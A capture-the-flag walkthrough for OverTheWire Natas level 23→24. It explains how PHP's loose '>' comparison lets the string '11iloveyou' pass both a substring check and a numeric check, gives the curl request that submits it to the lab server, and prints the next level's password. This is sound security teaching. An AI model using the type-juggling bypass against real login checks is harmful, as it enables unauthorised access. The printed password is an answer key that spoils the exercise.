# Natas Level 23 → 24

## Goal

A password form runs two checks on your input: `strstr($_REQUEST["passwd"],"iloveyou")` **and** `$_REQUEST["passwd"] > 10`. Both must pass. The gotcha is the numeric comparison — PHP's loose `>` operator juggles string-vs-number types, so a string that starts with digits (like `12iloveyou`) is both numerically > 10 *and* contains `iloveyou`.

## Concepts you'll learn

- PHP's **loose comparison** (`>`, `<`, `==`) and how it converts strings to numbers
- That `"12iloveyou" > 10` evaluates to `true` (PHP extracts leading digits)
- Why strict comparison (`===`, `<=>`) is the right tool

## Walkthrough

### 1. View the source

```php
if(array_key_exists("passwd", $_REQUEST)) {
    if(strstr($_REQUEST["passwd"], "iloveyou")
       && ($_REQUEST["passwd"] > 10)) {
        echo "The password for natas24 is <censored>";
    }
}
```

Two clauses ANDed together:

1. `strstr(..., "iloveyou")` — does the submitted value contain the literal substring `iloveyou`?
2. `$_REQUEST["passwd"] > 10` — is the submitted value (coerced to a number) greater than 10?

### 2. Build a string that passes both

`"11iloveyou"`:

- Contains `iloveyou` ✔
- Loose-coerces to the integer `11` ✔

### 3. Submit it

```bash
$ curl -u natas23:<pass> \
       --data-urlencode "passwd=11iloveyou" \
       http://natas23.natas.labs.overthewire.org/index.php | grep password
```

Expected:

```
The password for natas24 is OsRmXFguozKpTZZ5X14zNO43379LZveg
```

## The answer

The password for `natas24` is:

**`OsRmXFguozKpTZZ5X14zNO43379LZveg`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas23.natas.labs.overthewire.org/>
